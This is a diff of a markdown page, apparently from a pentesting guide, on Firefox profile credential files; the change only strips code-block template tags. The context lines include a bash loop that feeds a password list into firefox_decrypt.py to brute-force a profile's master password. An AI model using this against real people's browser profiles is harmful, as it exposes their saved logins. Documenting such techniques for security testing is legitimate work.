@@ -87,7 +87,7 @@ Inside the folder **of each profile** (_\~/.mozilla/firefox/\<ProfileName>/_) pa
 To try to decrypt the master password, you can use [https://github.com/unode/firefox\_decrypt](https://github.com/unode/firefox\_decrypt)\
 With the following script and call you can specify a password file to brute force:
 
-{% code title="brute.sh" %}
+
 ```bash
 #!/bin/bash
 
@@ -98,7 +98,7 @@ while read pass; do
   echo "$pass" | python firefox_decrypt.py
 done < $passfile
 ```
-{% endcode %}
+
 
 ![](<../../../.gitbook/assets/image (417).png>)
 
